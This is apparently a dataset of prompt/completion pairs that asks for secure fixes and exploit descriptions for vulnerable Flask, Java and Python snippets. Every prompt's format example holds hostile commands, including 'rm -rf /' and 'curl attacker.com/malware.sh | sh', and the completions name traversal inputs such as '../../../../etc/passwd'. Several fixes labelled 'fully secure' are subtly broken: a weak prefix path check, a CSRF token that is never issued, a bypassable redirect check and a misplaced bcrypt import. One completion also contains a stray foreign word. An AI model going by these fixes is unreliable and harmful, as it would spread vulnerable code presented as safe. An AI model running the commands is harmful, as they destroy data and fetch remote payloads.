{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Path Traversal\n- Vulnerable Code: import os\nfrom flask import Flask, request\napp = Flask(__name__)\n@app.route('/file')\ndef get_file():\n    filename = request.args.get('filename', '')\n    if '..' not in filename and '.py' not in filename:\n        return open(os.path.join('data', filename)).read()\n    else:\n        return 'Invalid file name'\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import os\\\\nfrom flask import Flask, request\\\\napp = Flask(__name__)\\\\n@app.route('/file')\\\\ndef get_file():\\\\n    filename = request.args.get('filename', '')\\\\n    if '..' not in filename and '.py' not in filename:\\\\n        return open(os.path.join('data', filename)).read()\\\\n    else:\\\\n        return 'Invalid file name'\", \"vulnerability_type\": \"Path Traversal\", \"cvss_score\": 6.5, \"fixed_code\": \"import os\\\\nfrom flask import Flask, request\\\\napp = Flask(__name__)\\\\n@app.route('/file')\\\\ndef get_file():\\\\n    filename = request.args.get('filename', '')\\\\n    allowed_files = [f for f in os.listdir('data') if not f.endswith('.py')]\\\\n    if filename in allowed_files:\\\\n        return open(os.path.join('data', filename)).read()\\\\n    else:\\\\n        return 'Invalid file name'\", \"exploit_ways\": [\"User could input '../../../../etc/passwd' to read the system's passwd file.\", \"Could use '../..' to traverse directories and access files outside the intended directory.\", \"If other sensitive files are present, they can be accessed by manipulating the filename parameter.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Path Traversal\n- Vulnerable Code: import os\\ndef read_file(file_path):\\n    base_directory = \"/safe_dir/\"\\n    if base_directory in file_path:\\n        full_path = os.path.join(base_directory, file_path.replace(base_directory, \"\", 1))\\n        with open(full_path, 'r') as file:\\n            return file.read()\\n    else:\\n        raise ValueError(\"Invalid path\")\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import os\\\\ndef read_file(file_path):\\\\n    base_directory = \\\\\\\"/safe_dir/\\\\\\\"\\\\n    if base_directory in file_path:\\\\n        full_path = os.path.join(base_directory, file_path.replace(base_directory, \\\\\\\"\\\\\\\", 1))\\\\n        with open(full_path, 'r') as file:\\\\n            return file.read()\\\\n    else:\\\\n        raise ValueError(\\\\\\\"Invalid path\\\\\\\")\", \"vulnerability_type\": \"Path Traversal\", \"cvss_score\": 6.5, \"fixed_code\": \"import os\\\\ndef read_file(file_path):\\\\n    base_directory = \\\\\\\"/safe_dir/\\\\\\\"\\\\n    safe_path = os.path.join(base_directory, file_path.lstrip('/'))\\\\n    if os.path.commonprefix([os.path.abspath(safe_path), os.path.abspath(base_directory)]) != os.path.abspath(base_directory):\\\\n        raise ValueError(\\\\\\\"Invalid path\\\\\\\")\\\\n    with open(safe_path, 'r') as file:\\\\n        return file.read()\", \"exploit_ways\": [\"An attacker can input '../etc/passwd' to read the /etc/passwd file.\", \"They could use '../../secret/key.txt' to access files in parent directories.\", \"Input like '../../../../var/log/auth.log' might leak authentication logs.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Race Condition (Difficult to Exploit)\n- Vulnerable Code: public class BankAccount {\n    private int balance = 100;\n\n    public void deposit(int amount) {\n        balance += amount;\n    }\n\n    public void withdraw(int amount) {\n        if (balance >= amount) {\n            balance -= amount;\n        }\n    }\n\n    public int getBalance() {\n        return balance;\n    }\n}\n- CVSS Score: 5.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"public class BankAccount {\\\\n    private int balance = 100;\\\\n\\\\n    public void deposit(int amount) {\\\\n        balance += amount;\\\\n    }\\\\n\\\\n    public void withdraw(int amount) {\\\\n        if (balance >= amount) {\\\\n            balance -= amount;\\\\n        }\\\\n    }\\\\n\\\\n    public int getBalance() {\\\\n        return balance;\\\\n    }\\\\n}\", \"vulnerability_type\": \"Race Condition (Difficult to Exploit)\", \"cvss_score\": 5.0, \"fixed_code\": \"public class BankAccount {\\\\n    private int balance = 100;\\\\n    private final Object lock = new Object();\\\\n\\\\n    public void deposit(int amount) {\\\\n        synchronized (lock) {\\\\n            balance += amount;\\\\n        }\\\\n    }\\\\n\\\\n    public void withdraw(int amount) {\\\\n        synchronized (lock) {\\\\n            if (balance >= amount) {\\\\n                balance -= amount;\\\\n            }\\\\n        }\\\\n    }\\\\n\\\\n    public int getBalance() {\\\\n        synchronized (lock) {\\\\n            return balance;\\\\n        }\\\\n    }\\\\n}\", \"exploit_ways\": [\"Multiple threads could deposit money simultaneously, leading to incorrect balance calculations.\", \"Concurrent withdrawals could result in overdraft situations where more money is withdrawn than deposited.\", \"An attacker with control over multiple threads could manipulate the balance by rapidly alternating deposits and withdrawals.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation (Low Severity)\n- Vulnerable Code: import javax.servlet.http.HttpSession;\\npublic class LoginServlet {\\n    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\n        HttpSession session = request.getSession(true);\\n        String sessionId = request.getParameter(\"sessionId\");\\n        if (sessionId != null) {\\n            session.changeSessionId(sessionId);\\n        }\\n        // other code\\n    }\\n}\n- CVSS Score: 4.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import javax.servlet.http.HttpSession;\\\\npublic class LoginServlet {\\\\n    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\\\n        HttpSession session = request.getSession(true);\\\\n        String sessionId = request.getParameter(\\\\\\\"sessionId\\\\\\\");\\\\n        if (sessionId != null) {\\\\n            session.changeSessionId(sessionId);\\\\n        }\\\\n        // other code\\\\n    }\\\\n}\", \"vulnerability_type\": \"Session Fixation (Low Severity)\", \"cvss_score\": 4.0, \"fixed_code\": \"import javax.servlet.http.HttpSession;\\\\npublic class LoginServlet {\\\\n    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\\\n        HttpSession session = request.getSession(true);\\\\n        // Do not allow client to specify the session ID\\\\n        // other code\\\\n    }\\\\n}\", \"exploit_ways\": [\"An attacker can provide a fixed session ID via URL parameter to maintain control over a user's session.\", \"By using the same session ID for multiple users, an attacker can hijack legitimate sessions if users log in.\", \"Attacker can exploit this by pre-generating a session ID and tricking users into logging in with it.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Request Forgery (CSRF)\n- Vulnerable Code: from flask import Flask, request, redirect\r\napp = Flask(__name__)\r\n\r\n@app.route('/change_email', methods=['POST'])\r\ndef change_email():\r\n    new_email = request.form['email']\r\n    user_id = request.cookies.get('user_id')\r\n    if user_id:\r\n        # Simulate database update\r\n        print(f\"Updating email for user {user_id} to {new_email}\")\r\n        return redirect('/profile')\r\n    else:\r\n        return 'User not logged in', 401\r\n\r\nif __name__ == '__main__':\r\n    app.run(debug=True)\n- CVSS Score: 6.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"from flask import Flask, request, redirect\\r\\\\napp = Flask(__name__)\\r\\\\n\\r\\\\n@app.route('/change_email', methods=['POST'])\\r\\\\ndef change_email():\\r\\\\n    new_email = request.form['email']\\r\\\\n    user_id = request.cookies.get('user_id')\\r\\\\n    if user_id:\\r\\\\n        # Simulate database update\\r\\\\n        print(f\\\\\\\"Updating email for user {user_id} to {new_email}\\\\\\\")\\r\\\\n        return redirect('/profile')\\r\\\\n    else:\\r\\\\n        return 'User not logged in', 401\\r\\\\n\\r\\\\nif __name__ == '__main__':\\r\\\\n    app.run(debug=True)\", \"vulnerability_type\": \"Cross-Site Request Forgery (CSRF)\", \"cvss_score\": 6.8, \"fixed_code\": \"from flask import Flask, request, redirect, session\\r\\\\nimport os\\r\\\\napp = Flask(__name__)\\r\\\\napp.secret_key = os.urandom(24)\\r\\\\n\\r\\\\n@app.route('/change_email', methods=['POST'])\\r\\\\ndef change_email():\\r\\\\n    if 'csrf_token' in session and request.form['csrf_token'] == session['csrf_token']:\\r\\\\n        new_email = request.form['email']\\r\\\\n        user_id = request.cookies.get('user_id')\\r\\\\n        if user_id:\\r\\\\n            # Simulate database update\\r\\\\n            print(f\\\\\\\"Updating email for user {user_id} to {new_email}\\\\\\\")\\r\\\\n            return redirect('/profile')\\r\\\\n    return 'Invalid CSRF token', 403\\r\\\\n\\r\\\\nif __name__ == '__main__':\\r\\\\n    app.run(debug=True)\", \"exploit_ways\": [\"An attacker can craft a malicious web page that submits a form to change the victim's email address without their consent.\", \"They could use JavaScript in a phishing email to automatically submit a request to change the email when the user visits a compromised site while logged into the application.\", \"The attacker could generate a series of such requests targeting multiple users to\u6279\u91cf change their email addresses.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Missing Security Headers\n- Vulnerable Code: from flask import Flask, render_template\napp = Flask(__name__)\n\n@app.route('/')\ndef home():\n    return render_template('index.html')\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n- CVSS Score: 6.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"from flask import Flask, render_template\\\\napp = Flask(__name__)\\\\n\\\\n@app.route('/')\\\\ndef home():\\\\n    return render_template('index.html')\\\\n\\\\nif __name__ == '__main__':\\\\n    app.run(host='0.0.0.0', port=5000)\", \"vulnerability_type\": \"Missing Security Headers\", \"cvss_score\": 6.8, \"fixed_code\": \"from flask import Flask, render_template, make_response\\\\napp = Flask(__name__)\\\\n\\\\n@app.route('/')\\\\ndef home():\\\\n    resp = make_response(render_template('index.html'))\\\\n    resp.headers['Content-Security-Policy'] = \\\\\\\"default-src 'self'\\\\\\\"\\\\n    resp.headers['X-Content-Type-Options'] = 'nosniff'\\\\n    resp.headers['X-Frame-Options'] = 'SAMEORIGIN'\\\\n    resp.headers['X-XSS-Protection'] = '1; mode=block'\\\\n    return resp\\\\n\\\\nif __name__ == '__main__':\\\\n    app.run(host='0.0.0.0', port=5000)\", \"exploit_ways\": [\"An attacker can inject malicious scripts into the website to perform XSS attacks.\", \"By exploiting missing security headers, an attacker can frame the web application in another site without any restriction.\", \"Without Content-Type sniffing protection, attackers could force browsers to misinterpret files as being of a different MIME type.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: # Python example\\nimport hashlib\\ndef authenticate(username, password):\\n    stored_password_hash = '2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b'\\n    password_hash = hashlib.md5(password.encode()).hexdigest()\\n    if username == 'admin' and stored_password_hash == password_hash:\\n        return True\\n    else:\\n        return False\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"# Python example\\\\nimport hashlib\\\\ndef authenticate(username, password):\\\\n    stored_password_hash = '2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b'\\\\n    password_hash = hashlib.md5(password.encode()).hexdigest()\\\\n    if username == 'admin' and stored_password_hash == password_hash:\\\\n        return True\\\\n    else:\\\\n        return False\", \"vulnerability_type\": \"Broken Authentication\", \"cvss_score\": 6.5, \"fixed_code\": \"# Python example\\\\nimport bcrypt\\\\ndef authenticate(username, password):\\\\n    stored_password_hash = b'$2b$12$KIXcVnWqG4jZr0sNlXkE/uPpA3yH0mOvTJ0C5w6R9UxQYRYh8zV3e' # bcrypt hash of 'password123'\\\\n    password_hash = bcrypt.hashpw(password.encode(), stored_password_hash)\\\\n    if username == 'admin' and bcrypt.checkpw(password.encode(), stored_password_hash):\\\\n        return True\\\\n    else:\\\\n        return False\", \"exploit_ways\": [\"An attacker could use a rainbow table to find the password for the MD5 hash.\", \"Since the hash is hardcoded, if the code is obtained, the hash can be cracked offline.\", \"If an attacker gains access to the source code, they can easily extract the admin credentials.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Session Fixation\n- Vulnerable Code: class SessionManager:\n    def __init__(self):\n        self.sessions = {}\n\n    def create_session(self, user_id, session_id):\n        if user_id not in self.sessions:\n            self.sessions[user_id] = session_id\n        return self.sessions[user_id]\n\n    def get_user(self, session_id):\n        for user_id, sid in self.sessions.items():\n            if sid == session_id:\n                return user_id\n        return None\n- CVSS Score: 4.0\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"class SessionManager:\\\\n    def __init__(self):\\\\n        self.sessions = {}\\\\n\\\\n    def create_session(self, user_id, session_id):\\\\n        if user_id not in self.sessions:\\\\n            self.sessions[user_id] = session_id\\\\n        return self.sessions[user_id]\\\\n\\\\n    def get_user(self, session_id):\\\\n        for user_id, sid in self.sessions.items():\\\\n            if sid == session_id:\\\\n                return user_id\\\\n        return None\", \"vulnerability_type\": \"Session Fixation\", \"cvss_score\": 4.0, \"fixed_code\": \"import uuid\\\\nclass SessionManager:\\\\n    def __init__(self):\\\\n        self.sessions = {}\\\\n\\\\n    def create_session(self, user_id):\\\\n        session_id = str(uuid.uuid4())\\\\n        self.sessions[session_id] = user_id\\\\n        return session_id\\\\n\\\\n    def get_user(self, session_id):\\\\n        return self.sessions.get(session_id)\", \"exploit_ways\": [\"An attacker could set a fixed session ID before the user logs in, capturing their session once authenticated.\", \"By manipulating session IDs, an attacker might take over a legitimate user's session if they guess or predict the session identifier.\", \"Attacker can force a target user to use a specific session ID via various means like phishing links containing a predetermined session token.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Open Redirect\n- Vulnerable Code: public class VulnerableApp {\\n    public void redirect(String url) {\\n        try {\\n            java.net.URI uri = new java.net.URI(url);\\n            if (uri.getHost().equals(\"trusted.com\")) {\\n                javax.swing.JOptionPane.showMessageDialog(null, \"Redirecting to trusted site: \" + url);\\n            } else {\\n                throw new Exception(\\\"Unauthorized redirect attempt\\\");\\n            }\\n        } catch (Exception e) {\\n            System.out.println(e.getMessage());\\n        }\\n    }\\n}\n- CVSS Score: 6.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"public class VulnerableApp {\\\\n    public void redirect(String url) {\\\\n        try {\\\\n            java.net.URI uri = new java.net.URI(url);\\\\n            if (uri.getHost().equals(\\\\\\\"trusted.com\\\\\\\")) {\\\\n                javax.swing.JOptionPane.showMessageDialog(null, \\\\\\\"Redirecting to trusted site: \\\\\\\" + url);\\\\n            } else {\\\\n                throw new Exception(\\\\\\\\\\\"Unauthorized redirect attempt\\\\\\\\\\\");\\\\n            }\\\\n        } catch (Exception e) {\\\\n            System.out.println(e.getMessage());\\\\n        }\\\\n    }\\\\n}\", \"vulnerability_type\": \"Open Redirect\", \"cvss_score\": 6.8, \"fixed_code\": \"public class SecureApp {\\\\n    public void redirect(String url) {\\\\n        String trustedDomain = \\\\\\\"trusted.com\\\\\\\";\\\\n        if (url != null && url.startsWith(\\\\\\\"https://\\\\\\\" + trustedDomain)) {\\\\n            try {\\\\n                java.net.URI uri = new java.net.URI(url);\\\\n                javax.swing.JOptionPane.showMessageDialog(null, \\\\\\\"Redirecting to trusted site: \\\\\\\" + url);\\\\n            } catch (Exception e) {\\\\n                System.out.println(e.getMessage());\\\\n            }\\\\n        } else {\\\\n            System.out.println(\\\\\\\"Unauthorized redirect attempt\\\\\\\");\\\\n        }\\\\n    }\\\\n}\", \"exploit_ways\": [\"An attacker can use URL encoding to bypass the check (e.g., http%3A//trusted.com).\", \"Crafting a URL like https://malicious.com?redirect=https://trusted.com could trick users into thinking they are on a trusted site.\", \"Using a shortener service for malicious URLs that redirects to trusted.com can deceive security checks.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Broken Authentication\n- Vulnerable Code: class UserAuth:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = password\n    \n    def authenticate(self, input_username, input_password):\n        if input_username == self.username and input_password == self.password:\n            return True\n        else:\n            return False\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"class UserAuth:\\\\n    def __init__(self, username, password):\\\\n        self.username = username\\\\n        self.password = password\\\\n    \\\\n    def authenticate(self, input_username, input_password):\\\\n        if input_username == self.username and input_password == self.password:\\\\n            return True\\\\n        else:\\\\n            return False\", \"vulnerability_type\": \"Broken Authentication\", \"cvss_score\": 7.5, \"fixed_code\": \"class UserAuth:\\\\n    import bcrypt\\\\n\\\\n    def __init__(self, username, password):\\\\n        self.username = username\\\\n        self.password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt())\\\\n\\\\n    def authenticate(self, input_username, input_password):\\\\n        return self.username == input_username and bcrypt.checkpw(input_password.encode('utf-8'), self.password_hash)\", \"exploit_ways\": [\"An attacker with knowledge of the username could brute force the password.\", \"If the password is weak or reused, it can be easily guessed or cracked using rainbow tables.\", \"An insider or malicious actor with access to the codebase could directly read the stored password and authenticate.\"]}"}
